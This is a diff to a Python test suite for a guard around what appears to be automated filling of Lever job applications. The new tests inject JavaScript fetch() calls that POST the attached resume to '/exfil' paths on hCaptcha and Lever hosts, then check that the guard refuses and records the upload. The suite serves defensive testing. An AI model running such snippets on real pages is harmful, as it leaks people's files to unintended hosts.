@@ -545,6 +545,48 @@ class GuardTests(LeverCase):
                 self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
                 self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")
 
+    WRITE_ADDRESSES = (
+        ("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api.hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"),
+        ("js.hcaptcha.com", "/exfil"),
+    )
+
+    def test_the_attached_file_as_the_raw_body_of_a_write_is_aborted_recorded_and_ends_the_run(self):
+        # ``fetch(address, {method: 'POST', body: input.files[0]})`` is not a multipart body and not an octet stream: it is the file's own bytes under the file's own type.
+        for host, path in self.WRITE_ADDRESSES:
+            with self.subTest(host=host):
+                fake = FakeLever()
+                fake.inject.append(script(self.ON_CHANGE % (
+                    f"setTimeout(function () {{ fetch('https://{host}{path}', {{method: 'POST', body: input.files[0]}}); }}, 50);")))
+                run = self.go(fake)
+                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
+                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")
+
+    def test_the_attached_file_posted_in_the_students_turn_before_their_first_press_is_aborted_and_closes_the_window(self):
+        # The file stays in the input for the student's turn, and a script on a timer can send it a moment after the fill. hCaptcha asks nothing of these addresses until the press.
+        posts = {
+            "a form with the file": "var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); return fetch(%r, {method: 'POST', body: data});",
+            "the raw file": "return fetch(%r, {method: 'POST', body: input.files[0]});",
+        }
+        for host, path in self.WRITE_ADDRESSES:
+            for what, code in posts.items():
+                with self.subTest(host=host, what=what):
+                    fake = FakeLever()
+                    sent = []
+
+                    def student(page, step, seen, code=code, host=host, path=path):
+                        if step == "handoff" and not sent:
+                            sent.append(1)
+                            page.evaluate("() => { var input = document.querySelector('#application-form input[name=resume]'); " + code % f"https://{host}{path}" + " }")
+
+                    run = self.go(fake, student=student)
+                    self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                    self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                    self.assertEqual(run.result.evidence["handoff_end"], "upload", "the window was closed")
+                    self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+
     def test_a_post_to_any_other_path_is_aborted_and_recorded_before_anything_is_filled(self):
         fake = FakeLever()
         fake.inject.append(script("fetch('/collect', {method: 'POST', body: 'x=1', headers: {'Content-Type': 'application/x-www-form-urlencoded'}});"))
